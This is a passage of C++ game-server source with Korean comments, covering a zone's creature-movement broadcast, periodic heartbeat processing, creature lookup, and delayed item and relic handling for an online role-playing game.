		gcKnockback.setObjectID(pCreature->getObjectID());
		gcKnockback.setOrigin(x1, y1);
		gcKnockback.setTarget(x2, y2);
	}

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + ( bSendMove ? gcMove.getPacketSize() : gcKnockback.getPacketSize() ) + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + ( bSendMove ? gcMove.getPacketSize() : gcKnockback.getPacketSize() ) + 2 );
#endif
	if ( bSendMove )
		gcMove.writeHeaderNBody( outputStream );
	else
		gcKnockback.writeHeaderNBody( outputStream );

	// GCAddNPC/GCAddMonster 패킷을 만들어둔다.
	Packet* pGCAddXXX = NULL;

	bool isMonster = !pCreature->isNPC();
//	bool isMonsterHide = false;
//	bool isMonsterInvisibility = false;

	if (!isMonster)
	{
		pNPC = dynamic_cast<NPC*>(pCreature);
		GCAddNPC* pGCAddNPC = new GCAddNPC();
		makeGCAddNPC(pGCAddNPC, pNPC);
		pGCAddXXX = pGCAddNPC;
	} 
	else // case of Monster
	{ 
		pMonster = dynamic_cast<Monster*>(pCreature);

		// 일단 다 볼 수 있는 상태(NULL)로 설정해서 packet을 생성한다. by sigi
		pGCAddXXX = createMonsterAddPacket( pMonster, NULL );

		// monster의 상태를 기억해둔다.
//		isMonsterHide = pMonster->isFlag(Effect::EFFECT_CLASS_HIDE);
//		isMonsterInvisibility = pMonster->isFlag(Effect::EFFECT_CLASS_INVISIBILITY);
	}

	// 시야에서 벗어날 때, GCDeleteObject 패킷을 보낸다.
	GCDeleteObject gcDeleteObject;
	gcDeleteObject.setObjectID(pCreature->getObjectID());

	//////////////////////////////////////////////////////////////////////////////
	// 시야 영역의 상하좌우 모두 + 1 씩 증가시킨다. 
	// 이유는 방향에 따른 ON_SIGHT 영역이 증가되기 때문이다.
	//////////////////////////////////////////////////////////////////////////////
	for (ZoneCoord_t ix = max(0, x2 - maxViewportWidth - 1), endx = min(m_Width - 1, x2 + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, y2 - maxViewportUpperHeight - 1), endy = min(m_Height - 1, y2 + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
			forward_list<Object*>::const_iterator itr = objectList.begin();
			for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; itr++) 
			{
				Assert(*itr != NULL);

				Creature* pPC = dynamic_cast<Creature*>(*itr);

				Assert(pPC != NULL);

				// PC 일 경우에만 GCMove, GCAddMonster 패킷을 보내준다. 몬스터한테는 보낼 필요가 없쥐~
				if (pPC->isPC()) 
				{
					Assert(pPC->getPlayer() != NULL);

					//////////////////////////////////////////////////////////////////////////////
					// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
					// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
					//////////////////////////////////////////////////////////////////////////////
					VisionState prevVS = pPC->getVisionState(x1,y1);
					VisionState currVS = pPC->getVisionState(x2,y2);

					// 보이지 않는 영역에서, 경계 영역을 거치지 않고 바로
					// 시야 내부 영역으로 들어온다는 것은 불가능하다.
					// 이제 쌩~ IN_SIGHT밖에 없다.
//					Assert(prevVS != OUT_OF_SIGHT || currVS != IN_SIGHT);

					// ObservingEye 이펙트를 가져온다.
//					EffectObservingEye* pEffectObservingEye = NULL;
//					if ( pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//					{
//						pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect(Effect::EFFECT_CLASS_OBSERVING_EYE));
//						//Assert( pEffectObservingEye != NULL );
//					}

					if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
					{
						if (isMonster)
						{
							if ( canSee( pPC, pMonster ) )
							{
								pPC->getPlayer()->sendPacket(pGCAddXXX);
							}
						}
						else
						{
							pPC->getPlayer()->sendPacket(pGCAddXXX);
						}
					} 
					else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
					{
						//if (bSendMove)
						//{
						//	pPC->getPlayer()->sendPacket(&gcMove);
						//}
						//else if (bKnockback)
						//{
						//	pPC->getPlayer()->sendPacket(&gcKnockback);
						//}
						pPC->getPlayer()->sendStream( &outputStream );
					} 
					else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT) 
					{
						pPC->getPlayer()->sendPacket(&gcDeleteObject);
					}

					//--------------------------------------------------------------------------------
					// 브로드캐스트를 했으면, 이제 이 PC를 잠재적인 적으로 등록해버리자.
					//--------------------------------------------------------------------------------
					if (pCreature->isMonster())
					{
						// 저 위에서 이미 dynamic_cast 된 상태이다.
						VisionState vs = pMonster->getVisionState(ix,iy);
						if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE) 
						{
							if (isPotentialEnemy(pMonster, pPC))
							{
								pMonster->addPotentialEnemy(pPC);
							}
						}
					}
					
				}//if

			}//for

		}//for

	}//for

	// 생성한 패킷을 삭제한다.
	SAFE_DELETE(pGCAddXXX);

	// by sigi. 2002.12.15
	} catch (Throwable& t) {
		filelog("moveCreatureBroadcastError.log", "%s", t.toString().c_str());

		// 다시 던져서 죽이자 - -;
		throw;
	}

	__END_PROFILE_ZONE("Z_BC_MOVE_CREATURE")

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// 일정 주기마다 해줘야 하는 기능들을 여기에 추가하도록 한다.
//////////////////////////////////////////////////////////////////////////////
void Zone::heartbeat ()
	
{
	__BEGIN_TRY
	__BEGIN_DEBUG

	try
	{
		__ENTER_CRITICAL_SECTION(m_Mutex)

		beginProfileEx("Z_PCQUEUE");

		// PCQueue의 PC를 존에 추가한다.	
		while(! m_PCListQueue.empty()) 
		{
			Creature* pCreature = m_PCListQueue.front();
			Assert(pCreature != NULL);
			Assert(pCreature->getZone() == this);

			// 존에 추가하고, 주변 PC들에게 브로드캐스트한다.
			addPC(pCreature, pCreature->getX(), pCreature->getY(), DOWN);

			m_PCListQueue.pop_front();
		}

		endProfileEx("Z_PCQUEUE");

		beginProfileEx("Z_PC");
		m_pPCManager->processCreatures(); // process all PC
		endProfileEx("Z_PC");

		// 마스터 레어 매니저가 있다면 마스터 레어이다
		// by sigi. 2002.9.2
		if (m_pMasterLairManager!=NULL)
			m_pMasterLairManager->heartbeat(); // process master lair

		// WarScheduler가 있다면 성이지..
		// by sigi. 2003.1.24
		if (m_pWarScheduler!=NULL
			&& g_pVariableManager->isWarActive())
		{
			Work* pWork = m_pWarScheduler->heartbeat();

			if (pWork!=NULL)
			{
				War* pWar = dynamic_cast<War*>(pWork);
				Assert(pWar!=NULL);

				g_pWarSystem->addWarDelayed( pWar );
			}
		}

		if ( m_pLevelWarManager != NULL
			&& g_pVariableManager->isActiveLevelWar() )
		{
			m_pLevelWarManager->heartbeat();
		// LevelWar Zone 에는 시간 별로 유료 무료 사용자 출입제한이 이상해서 해줘야 함.
			m_pLevelWarManager->freeUserTimeCheck();
		}

//		if ( m_pLevelWarManager != NULL )
//		{
//		}

		// player가 있어야 monster를 heartbeat한다.
		// 즉, player가 없는 zone은 monster가 가만히 있는다.
		// monster의 EffectManager가 안 돌아가므로 문제가 될 수도 있지만,
		// 크게 문제가 없다고 보고.. -_-; .. by sigi. 2002.5.6
		//if ( m_ZoneID >= 1121 && m_ZoneID <= 1124)
		//	m_pCombatMonsterManager->processCreatures(); // 전투용 몬스터의 AI를 처리하는 부분, 김경석
		//else
		//{
			if ( getPCCount() > 0 || ( isDynamicZone() && ( m_pDynamicZone->getStatus() == DYNAMIC_ZONE_STATUS_RUNNING ) ) )
			{
				beginProfileEx("Z_MONSTER");
				m_pMonsterManager->processCreatures(); // process all monsters
				endProfileEx("Z_MONSTER");
			}

//			m_pEventMonsterManager->processCreatures();
		//}

		beginProfileEx("Z_NPC");
		m_pNPCManager->processCreatures(); // process all npcs
		endProfileEx("Z_NPC");

		beginProfileEx("Z_ESCH");
		// 먼저 이펙트 스케쥴을 먼저 실행시킨다.
		m_pEffectScheduleManager->heartbeat();
		endProfileEx("Z_ESCH");

		// Item의 EffectManager에서 getCurrentTime을 호출하지 않게 하기 위해서.
		// by sigi. 2002.5.8
		Timeval currentTime;
	    getCurrentTime(currentTime);

		// Delete expired effects
		beginProfileEx("Z_EFFECT");
		m_pVampirePortalManager->heartbeat(currentTime);

		__ENTER_CRITICAL_SECTION(m_MutexEffect)
		m_pLockedEffectManager->heartbeat(currentTime);
		__LEAVE_CRITICAL_SECTION(m_MutexEffect)

		m_pEffectManager->heartbeat(currentTime);

		endProfileEx("Z_EFFECT");

		beginProfileEx("Z_WEATHER");
		// weather changing...
		m_pWeatherManager->heartbeat();
		endProfileEx("Z_WEATHER");

		beginProfileEx("Z_ITEM");
		// item heartbeaet

		int i = 0;

		for (unordered_map<ObjectID_t, Item*>::iterator itr = m_Items.begin(); itr != m_Items.end() ; itr++)
		{
			Item* pItem = itr->second;
			Assert(pItem != NULL);

			// by sigi. for debugging. 2002.12.23
			m_LastItemClass = (int)pItem->getItemClass();

			EffectManager& rEffectManager = pItem->getEffectManager();
			rEffectManager.heartbeat(currentTime);
			i++;
		}

		endProfileEx("Z_ITEM");

		beginProfileEx("Z_PARTY");
		// party heartbeat
		m_pLocalPartyManager->heartbeat();
		endProfileEx("Z_PARTY");

		__LEAVE_CRITICAL_SECTION(m_Mutex)

		Timeval currentTime;
	    getCurrentTime(currentTime);

		// time band 를 갱신한다.
		if ( m_UpdateTimebandTime < currentTime )
		{
			if ( !m_bTimeStop )
			{
				m_Timeband = g_pTimeManager->getTimeband();
			}

			// 5초마다 timeband 를 갱신한다. 게임 시간으로 2분
			m_UpdateTimebandTime.tv_sec += 5;
		}

		// DynamicZone 일 경우
		if ( isDynamicZone() )
			m_pDynamicZone->heartbeat();
	}
	catch (Throwable & t)
	{
		filelog("ZoneBug.txt", "%s : %s", "Zone::heartbeat(2)", t.toString().c_str());
		cerr << t.toString() << endl;
		throw;
	}

	m_LoadValue ++;

	__END_DEBUG
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// PCManager, MonsterManager, NPCManager 에서 지정된 OID 를 가진 크리처를
// 찾아서 리턴한다. 없을 경우 NoSuchElementException 을 던진다.
//
// 이 메쏘드는 찾고자 하는 크리처의 타입(PC,NPC,Monster)를 모를 경우에
// 사용한다. 웬만하면, 타입을 알아내서 getCreature(Creature::CreatureClass,ObjectID_t) 
// 메쏘드를 사용하도록 한다.
//////////////////////////////////////////////////////////////////////////////
Creature* Zone::getCreature(ObjectID_t objectID) const
	//NoSuchElementException, Error)
{
	__BEGIN_TRY

	// NoSuchElementException을 안 쓰는 버전 by sigi. 2002.5.2
	Creature* pCreature = NULL;

	pCreature = m_pMonsterManager->getCreature(objectID);

	if (pCreature==NULL)
	{
		pCreature = m_pPCManager->getCreature(objectID);

		if (pCreature==NULL)
		{
			pCreature = m_pNPCManager->getCreature(objectID);

//			if (pCreature==NULL)
//			{
//				pCreature = m_pEventMonsterManager->getCreature(objectID);
//			}

		}
	}

	return pCreature;

	/*
	try 
	{
		return m_pMonsterManager->getCreature(objectID);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 
	*/

/*
//#ifdef __XMAS_EVENT_CODE__
	try 
	{
		return m_pEventMonsterManager->getCreature(objectID);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 
//#endif
*/
	/*
	try 
	{
		return m_pPCManager->getCreature(objectID);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 

	try 
	{
		return m_pNPCManager->getCreature(objectID);
	} 
	catch (NoSuchElementException) 
	{
		throw;
	}
	*/

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// PCManager, MonsterManager, NPCManager 에서 지정된 Name을 가진 크리처를 찾아서
// 리턴한다. 없을 경우 NoSuchElementException 을 던진다.
//
// 이 메쏘드는 찾고자 하는 크리처의 타입(PC,NPC,Monster)를 모를 경우에 사용한다.
// 웬만하면, 타입을 알아내서 getCreature(Creature::CreatureClass,Name) 
// 메쏘드를 사용하도록 한다.
//////////////////////////////////////////////////////////////////////////////
Creature* Zone::getCreature(const string& Name) const
	//NoSuchElementException, Error)
{
	__BEGIN_TRY

	// NoSuchElementException을 안 쓰는 버전 by sigi. 2002.5.2
	Creature* pCreature = NULL;

	pCreature = m_pPCManager->getCreature(Name);

	if (pCreature==NULL)
	{
		pCreature = m_pMonsterManager->getCreature(Name);

		if (pCreature==NULL)
		{
			pCreature = m_pNPCManager->getCreature(Name);

//			if(pCreature==NULL)
//			{
//				pCreature = m_pEventMonsterManager->getCreature(Name);
//			}
		}

		
	}

	return pCreature;

	/*
	try 
	{
		return m_pPCManager->getCreature(Name);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 

	try 
	{
		return m_pMonsterManager->getCreature(Name);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 
	*/

/*
#ifdef __XMAS_EVENT_CODE__
	try 
	{
		return m_pEventMonsterManager->getCreature(Name);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 
#endif
*/

	/*
	try 
	{
		return m_pNPCManager->getCreature(Name);
	} 
	catch (NoSuchElementException) 
	{
		throw;
	}
	*/

	__END_CATCH
}

//--------------------------------------------------------------------------------
//
// 존에서 특정 OID를 가진 특정 크리처 타입을 가진 크리처를 찾아서 리턴한다.
//
//--------------------------------------------------------------------------------
Creature* Zone::getCreature(Creature::CreatureClass creatureClass, ObjectID_t objectID) const
	
{
	__BEGIN_TRY

	if (creatureClass == Creature::CREATURE_CLASS_SLAYER)
	{
		return m_pPCManager->getCreature(objectID);
	}
	else if (creatureClass == Creature::CREATURE_CLASS_VAMPIRE)
	{
		return m_pPCManager->getCreature(objectID);
	}
	else if (creatureClass == Creature::CREATURE_CLASS_OUSTERS)
	{
		return m_pPCManager->getCreature(objectID);
	}
	else if (creatureClass == Creature::CREATURE_CLASS_NPC)
	{
		return m_pNPCManager->getCreature(objectID);
	}
	else if (creatureClass == Creature::CREATURE_CLASS_MONSTER)
	{
		return m_pMonsterManager->getCreature(objectID);
	}
/*
#ifdef __XMAS_EVENT_CODE__
		try
		{
			return m_pMonsterManager->getCreature(objectID);
		}
		catch (NoSuchElementException& nsee)
		{
		}

		return m_pEventMonsterManager->getCreature(objectID);
#else
*/
/*
#endif
*/

	return NULL; // evade warning.

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// get debug string
//////////////////////////////////////////////////////////////////////////////
string Zone::toString () const
	
{
	__BEGIN_TRY

	StringStream msg;

	msg << "Zone("
		<< "ZoneID:"          << (int)m_ZoneID
		<< ",ZoneGroupID:"    << (int)m_pZoneGroup->getZoneGroupID() 
		<< ",ZoneType:"       << (int)m_ZoneType
		<< ",ZoneLevel:"      << (int)m_ZoneLevel
		<< ",ZoneAccessMode:" << (int)m_ZoneAccessMode
		<< ",OwnerID:"        << m_OwnerID
		<< ",DarkLevel:"      << (int)m_DarkLevel
		<< ",LightLevel:"     << (int)m_LightLevel
		<< ",WeatherManager:" << m_pWeatherManager->toString();

	msg << ",#NPC:" << (int)m_NPCCount;
	for (uint i = 0 ; i < m_NPCCount ; i++)
		msg << ",NPC[" << i << "] : " << (int)m_NPCTypes[i];

	msg << ",#Monster:" << (int)m_MonsterCount;

	Assert( m_MonsterCount < maxMonsterPerZone );	// by sigi
	for (uint i = 0 ; i < m_MonsterCount ; i++)
		msg << ",Monster[" << i << "] : " << (int)m_MonsterTypes[i];

	msg << ",Width:"  << (int)m_Width
		<< ",Height:" << (int)m_Height
		<< ")";

	return msg.toString();

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// pTargetCreture를 볼 수 있는 자(player)들의 list를 돌려준다.
// **********************************
//////////////////////////////////////////////////////////////////////////////
list<Creature*> Zone::getWatcherList(ZoneCoord_t x, ZoneCoord_t y, Creature* pTargetCreature)
	
{
	__BEGIN_TRY

	list<Creature*> cList;

	__BEGIN_PROFILE_ZONE("Z_GET_WATCHERLIST")

	if ( pTargetCreature == NULL )
		return cList;

	////////////////////////////////////////////////////////////
	// 시야 영역의 상하좌우 모두 + 1 씩 증가시킨다. 
	// 이유는 방향에 따른 ON_SIGHT 영역이 증가되기 때문이다.
	////////////////////////////////////////////////////////////
	for (ZoneCoord_t ix = max(0, x - maxViewportWidth - 1), endx = min(m_Width - 1, x + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, y - maxViewportUpperHeight - 1), endy = min(m_Height - 1, y + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
			forward_list<Object*>::const_iterator itr = objectList.begin();
			for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; itr++) 
			{
				Assert(*itr != NULL);

				Creature* pCreature = dynamic_cast<Creature*>(*itr);

				Assert(pCreature != NULL);

				if (pCreature->isPC()) 
				{
					Assert(pCreature->getPlayer() != NULL);

					// 자기 자신의 정보는 받을 필요가 없다.
					if (pTargetCreature == pCreature
						|| pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)) continue;
				
					VisionState vs = pCreature->getVisionState(x,y);

					if (vs >= IN_SIGHT)
					{
						if ( canSee( pCreature, pTargetCreature ) )
						{
							cList.push_back(pCreature);
						}
					}
				}//if

			}//for

		}//for

	}//for

	__END_PROFILE_ZONE("Z_GET_WATCHERLIST")

	return cList;
	
	__END_CATCH
}

void Zone::addToItemList(Item* pItem) 
{
	__BEGIN_TRY

	m_Items[ pItem->getObjectID()] = pItem;

	__END_CATCH
}

void Zone::deleteFromItemList(ObjectID_t id) 
{
	__BEGIN_TRY

	unordered_map< ObjectID_t, Item*>::iterator itr = m_Items.find(id);

	if (itr == m_Items.end())
		//throw NoSuchElementException();
		// NoSuch제거. by sigi. 2002.5.3
	{
		return;
	}

	m_Items.erase(itr);

	__END_CATCH
}

void Zone::addVampirePortal(ZoneCoord_t cx, ZoneCoord_t cy, Vampire* pVampire, const ZONE_COORD& ZoneCoord) 
	
{
	__BEGIN_TRY

	Assert(m_OuterRect.ptInRect(cx, cy));
	Assert(pVampire != NULL);

	// 뱀파이어의 능력에 따라 들어갈 수 있는 인원과, 지속 시간을 계산한다.
	// 존에 바로 추가되는 것이 아니므로, 약간의 딜레이를 추가해준다.
	Duration_t duration = (60 + (pVampire->getINT(ATTR_CURRENT)-20)/3) * 10 + 20; // 0.1초 단위기 때문에...
	int        count    = 3 + (pVampire->getINT(ATTR_CURRENT)-20)/10;

	// 일단 이펙트 객체 자체를 생성한다.
	EffectVampirePortal* pEffectVampirePortal = new EffectVampirePortal(this, cx, cy);
	pEffectVampirePortal->setDeadline(duration);
	pEffectVampirePortal->setOwnerID(pVampire->getName());
	pEffectVampirePortal->setZoneCoord(ZoneCoord.id, ZoneCoord.x, ZoneCoord.y);
	pEffectVampirePortal->setCount(count);

	// 이펙트 스케쥴을 생성해서 더한다.
	EffectSchedule* pEffectSchedule = new EffectSchedule;
	pEffectSchedule->setEffect(pEffectVampirePortal);
	pEffectSchedule->addWork(WORKCODE_ADD_VAMPIRE_PORTAL, NULL);
	m_pEffectScheduleManager->addEffectSchedule(pEffectSchedule);

	__END_CATCH
}

//-------------------------------------------------------------
// deleteMotorcycle( x, y, pMotorcycle )
//-------------------------------------------------------------
// 바로 지우지 않고.. zone의 heartbeat할때 지우도록
// EffectDecayItem을 붙여둔다.
//-------------------------------------------------------------
void Zone::deleteMotorcycle(ZoneCoord_t cx, ZoneCoord_t cy, Motorcycle* pMotorcycle)
	
{
	__BEGIN_TRY

	Assert(m_OuterRect.ptInRect(cx, cy));
	Assert(pMotorcycle != NULL);

	EffectDecayItem* pEffectDecayItem = new EffectDecayItem(this, cx, cy, (Item*)pMotorcycle, 0, 
															false); // DB에서는 지우지 않는다.
	pEffectDecayItem->setNextTime(999999);
	m_ObjectRegistry.registerObject(pEffectDecayItem);
	addEffect_LOCKING(pEffectDecayItem);
	
	__END_CATCH
}

/*
void Zone::decayMotorcycle(ZoneCoord_t cx, ZoneCoord_t cy, Motorcycle* pMotorcycle, Slayer* pSlayer)
	
{
	__BEGIN_TRY

	cout << "Zone::decayMotorcycle	" << endl;

	Assert(m_OuterRect.ptInRect(cx, cy));
	Assert(pMotorcycle != NULL);

	// 존에서 오토바이를 지우는 이펙트를 추가한다.
	EffectDecayMotorcycle* pEffectDecayMotorcycle = new EffectDecayMotorcycle(this, cx, cy, (Item*)pMotorcycle, 0, 
															      false); // DB에서는 지우지 않는다.
	pEffectDecayMotorcycle->setNextTime(999999);
	m_ObjectRegistry.registerObject(pEffectDecayMotorcycle);
	addEffect_LOCKING(pEffectDecayMotorcycle);
	
	__END_CATCH
}
*/

//-------------------------------------------------------------
// transportItemToCorpse
//-------------------------------------------------------------
// 현재 존의 pItem을 pZone의 (cx, cy)로 옮긴다.
// EffectTransportItem을 붙여서 옮긴다.
//-------------------------------------------------------------
void Zone::transportItemToCorpse(Item* pItem, Zone* pTargetZone, ObjectID_t corpseObjectID)
	
{
	__BEGIN_TRY

	//cout << "transportItemToCorpse : " << (int)pZone->getZoneID() << ", (" << cx << ", " << cy << ")" << endl;
	Assert(pItem != NULL);

	if (pTargetZone->getZoneGroup()==this->getZoneGroup())
	{
		//cout << "same zone - to corpse" << endl;
		// 같은 zone이면 바로 옮긴다.
		//deleteFromItemList(pItem->getObjectID());

		Item* pCorpseItem = pTargetZone->getItem( corpseObjectID );

		if (pCorpseItem==NULL)
		{
			StringStream msg;
			msg << "[" << (int)m_ZoneID << "] 시체가 없네: corpseObjectID=" << (int)corpseObjectID;

			throw Error(msg.toString());
		}
		else if (pCorpseItem->getItemClass()!=Item::ITEM_CLASS_CORPSE)
		{
			StringStream msg;
			msg << "[" << (int)m_ZoneID << "] 시체가 아니네: corpseObjectID=" << (int)corpseObjectID
				<< ", itemClass=" << (int)pCorpseItem->getItemClass() 
				<< ", itemType=" << (int)pCorpseItem->getItemType();

			throw Error(msg.toString());
		}
		else
		{
			Corpse* pCorpse = dynamic_cast<Corpse*>(pCorpseItem);
			Assert(pCorpse!=NULL);

			pCorpse->addTreasure( pItem );
		}
	}
	else
	{
		//cout << "transportItemToCorpse" << endl;
		EffectTransportItemToCorpse* pEffectTransportItem = new EffectTransportItemToCorpse(this, pItem, pTargetZone, corpseObjectID, 0);
		pEffectTransportItem->setNextTime(999999);
		m_ObjectRegistry.registerObject(pEffectTransportItem);
		addEffect_LOCKING(pEffectTransportItem);
	}
	
	__END_CATCH
}

//-------------------------------------------------------------
// transportItem
//-------------------------------------------------------------
// 현재 존의 pItem을 pZone의 (cx, cy)로 옮긴다.
// EffectTransportItem을 붙여서 옮긴다.
//-------------------------------------------------------------
void Zone::transportItem(ZoneCoord_t x, ZoneCoord_t y, Item* pItem, 
						Zone* pZone, ZoneCoord_t cx, ZoneCoord_t cy)
	
{
	__BEGIN_TRY

	//cout << "transportItem : " << (int)pZone->getZoneID() << ", (" << cx << ", " << cy << ")" << endl;

	// 이거 잘못해놔가 다운돼다. ㅜ.ㅜ; by sigi
	Assert(m_OuterRect.ptInRect(x, y));
	Assert(pItem != NULL);

	if (pZone->getZoneGroup()==this->getZoneGroup())
	{
		//cout << "same zone" << endl;
		// 같은 zone group 이면 바로 옮긴다.
		deleteFromItemList(pItem->getObjectID());
		getTile(x, y).deleteItem();

		// 아이템이 사라졌다는 패킷을 날린다.
		GCDeleteObject gcDeleteObject;
		gcDeleteObject.setObjectID(pItem->getObjectID());

		broadcastPacket(x, y , &gcDeleteObject);

		pZone->getObjectRegistry().registerObject(pItem);
		pZone->addItem(pItem, cx, cy);
	}
	else
	{
		//cout << "transportItem" << endl;
		EffectTransportItem* pEffectTransportItem = new EffectTransportItem(this, x, y, pZone, cx, cy, pItem, 0);
		pEffectTransportItem->setNextTime(999999);
		m_ObjectRegistry.registerObject(pEffectTransportItem);
		addEffect_LOCKING(pEffectTransportItem);
	}
	
	__END_CATCH
}

//-------------------------------------------------------------
// add Item To Corpse Delayed
//-------------------------------------------------------------
// 아이템을 추가하는데.. 다른 thread에서 해도 된다.
// 다른 heartbeat에서 추가된다.
//-------------------------------------------------------------
void Zone::addItemToCorpseDelayed(Item* pItem, ObjectID_t corpseItemID)
	
{
	__BEGIN_TRY

	Assert(pItem != NULL);

	EffectAddItemToCorpse* pEffectAddItem = new EffectAddItemToCorpse(this, pItem, corpseItemID, 0);
	pEffectAddItem->setNextTime(999999);
	m_ObjectRegistry.registerObject(pEffectAddItem);
	addEffect_LOCKING(pEffectAddItem);
	
	__END_CATCH
}

//-------------------------------------------------------------
// add Item Delayed
//-------------------------------------------------------------
// 아이템을 추가하는데.. 다른 thread에서 해도 된다.
// 다른 heartbeat에서 추가된다.
//-------------------------------------------------------------
void Zone::addItemDelayed(Item* pItem, ZoneCoord_t cx, ZoneCoord_t cy, bool bAllowCreature)
	
{
	__BEGIN_TRY

	Assert(m_OuterRect.ptInRect(cx, cy));
	Assert(pItem != NULL);

	EffectAddItem* pEffectAddItem = new EffectAddItem(this, cx, cy, pItem, 0, bAllowCreature);
	pEffectAddItem->setNextTime(999999);
	m_ObjectRegistry.registerObject(pEffectAddItem);
	addEffect_LOCKING(pEffectAddItem);
	
	__END_CATCH
}

// 아직 테스트 안 해본 코드.
void Zone::deleteItemDelayed(Object* pObject, ZoneCoord_t x, ZoneCoord_t y)
	
{
	__BEGIN_TRY
	
	Assert(m_OuterRect.ptInRect(x, y));
	Assert( pObject != NULL );

	EffectDeleteItem* pEffectDeleteItem = new EffectDeleteItem(this, x, y, pObject, 0);
	pEffectDeleteItem->setNextTime(999999);
	m_ObjectRegistry.registerObject(pEffectDeleteItem);
	addEffect_LOCKING(pEffectDeleteItem);

	__END_CATCH
}

//-------------------------------------------------------------
// add Relic Item
//-------------------------------------------------------------
// 아이템을 추가하는데.. 다른 thread에서 해도 된다.
// 다른 heartbeat에서 추가된다.
//-------------------------------------------------------------
bool Zone::addRelicItem(int relicIndex)
	
{
	__BEGIN_TRY

	//cout << "[addRelicItem] ZoneID=" << (int)m_ZoneID << ", relicIndex=" << relicIndex << endl;

	const RelicInfo* pRelicInfo = dynamic_cast<RelicInfo*>(g_pRelicInfoManager->getItemInfo(relicIndex));

	int cx = pRelicInfo->x;
	int cy = pRelicInfo->y;

	Assert(m_OuterRect.ptInRect(cx, cy));

	// 이미 성물 보관대가 있는 경우
	if (m_bHasRelicTable)
	{
		return false;
		// 현재 존의 성물 보관대를 찾는다. (addItem될때 Zone에 좌표 x,y를 기억해두자)
        // 성물 보관대에 아무런 성물도 없다면 return
        // 아니면, 자기 성물이 아닌 성물을 원래의 성물보관대에 넣는다.
		// addItemDelayed를 사용해서 원래의 Zone에 추가해버리면 된다.
	}
	else
	{
		// Monster를 생성한다.
		Monster* pMonster = NULL;
		try {
			pMonster = new Monster(pRelicInfo->monsterType);

			m_ObjectRegistry.registerObject(pMonster);

		} catch (Throwable& ) {
			SAFE_DELETE(pMonster);
			return false;
		}

		//cout << "new Monster OK" << endl;

		// MonsterCorpse를 생성한다. (성물 보관대)
		MonsterCorpse* pMonsterCorpse = NULL;
		try {
			pMonsterCorpse = new MonsterCorpse(pMonster);
			pMonsterCorpse->setDir( 2 );
			pMonsterCorpse->setZone( this );
			pMonsterCorpse->setX( cx );
			pMonsterCorpse->setY( cy );
			Assert(pMonsterCorpse != NULL);
		} catch (Throwable& t) {
			//cout << t.toString().c_str() << endl;
		}

		//cout << "new MonsterCorpse OK" << endl;

		if (pRelicInfo->relicType==RELIC_TYPE_SLAYER)
		{
			Effect* pRelicTable = new EffectSlayerRelicTable(pMonsterCorpse);
			pRelicTable->setNextTime(999999);
			m_ObjectRegistry.registerObject(pRelicTable);

			pMonsterCorpse->getEffectManager().addEffect( pRelicTable );
			pMonsterCorpse->setFlag( Effect::EFFECT_CLASS_SLAYER_RELIC_TABLE );

			g_pCombatInfoManager->setRelicOwner(relicIndex, CombatInfoManager::RELIC_OWNER_SLAYER);
		}
		else
		{
			Effect* pRelicTable = new EffectVampireRelicTable(pMonsterCorpse);
			pRelicTable->setNextTime(999999);
			m_ObjectRegistry.registerObject(pRelicTable);

			pMonsterCorpse->getEffectManager().addEffect( pRelicTable );
			pMonsterCorpse->setFlag( Effect::EFFECT_CLASS_VAMPIRE_RELIC_TABLE );

			g_pCombatInfoManager->setRelicOwner(relicIndex, CombatInfoManager::RELIC_OWNER_VAMPIRE);
		}

		// Relic을 생성한다.
		list<OptionType_t> optionNULL;
		Item* pItem = g_pItemFactoryManager->createItem(Item::ITEM_CLASS_RELIC, relicIndex, optionNULL);
		Assert(pItem!=NULL);

		//cout << "new RelicItem OK" << endl;

		// 이 Zone은 RelicTable을 갖고 있다고 표시한다.
		m_bHasRelicTable = true;

		pMonsterCorpse->addTreasure(pItem);

		// 일단 relic은 DB에 생성한다.
		// 대신 CGDissectionCorpseHandler에서 create하지 않는다.
		// 보관대에서 꺼낼때마다 create되지 않게하기 위해서이다.
		pItem->create("", STORAGE_CORPSE, pMonsterCorpse->getObjectID(), 0, 0);

		if (pRelicInfo->relicType==RELIC_TYPE_SLAYER)
		{
			EffectSlayerRelic* pEffect = new EffectSlayerRelic(pMonsterCorpse);
			pMonsterCorpse->getEffectManager().addEffect( pEffect );
			pMonsterCorpse->setFlag(Effect::EFFECT_CLASS_SLAYER_RELIC);
			pEffect->affect(pMonsterCorpse);
